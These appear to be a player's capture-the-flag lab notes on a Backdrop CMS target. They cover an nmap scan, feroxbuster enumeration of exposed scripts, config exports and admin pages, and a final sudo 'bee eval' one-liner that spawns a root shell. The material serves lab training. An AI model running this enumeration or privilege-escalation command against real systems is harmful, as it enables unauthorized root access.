
nmap -sV  10.10.11.58 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 04:56 CEST
Nmap scan report for 10.10.11.58
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds


feroxbuster -u http://10.10.11.58/ -w /usr/share/wordlists/seclists/PathBANGER.txt  -x php,sh 
gets us a shit ton of hits so here are some of the intersting ones
```
### 🧠 **Interesting Files (Potentially Sensitive or Useful Info)**

- `http://10.10.11.58/README.md`
    
- `http://10.10.11.58/settings.php` _(zero-length, but a common config file worth checking manually)_
    

---

### ⚙️ **Executable Scripts**

- `http://10.10.11.58/core/scripts/install.sh`
    
- `http://10.10.11.58/core/scripts/backdrop.sh`
    
- `http://10.10.11.58/core/scripts/generate-d7-content.sh`
    
- `http://10.10.11.58/core/scripts/dump-database-d7.sh`
    
- `http://10.10.11.58/core/scripts/password-hash.sh`
    
- `http://10.10.11.58/core/scripts/run-tests.sh`
    
- `http://10.10.11.58/core/scripts/test.script`
    

---

### 📂 **Config Files (JSON / YAML / etc.)**

Under `/files/config_*/active/`:

- All the `*.json` files here represent **Drupal/Backdrop config exports**, including:
    
    - `user.role.authenticated.json`
        
    - `system.core.json`
        
    - `user.role.administrator.json`
        
    - `filter.format.full_html.json`
        
    - `menu.menu.main-menu.json`
        
    - `layout.layout.home.json`
        
    - `user.mail.json`
        
    - `views.view.user_admin.json`
        
    - and many more...
        

These give a **full view of the site structure, roles, views, and content types**. Very useful.

---

### 🖼️ **User-uploaded Content (images, styles, etc.)**

- `/files/field/image/*.jpg`
    
    - `dog.jpeg`
        
    - `dog-animal_dotorlbdd7.jpg`
        
    - `dog-obesity.jpg`
        
    - `dog-food.jpg`
        
    - Suggests possible image upload functionality
        

---

### 🛠️ **Admin/Install/Update Pages**

- `http://10.10.11.58/core/install.php`
    
- `http://10.10.11.58/core/authorize.php` _(403, but still interesting)_
    
- `http://10.10.11.58/core/update.php` _(403)_
    
- `http://10.10.11.58/core/cron.php` _(403)_
    
- `http://10.10.11.58/index.php`
```



`   sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('/bin/sh');"   `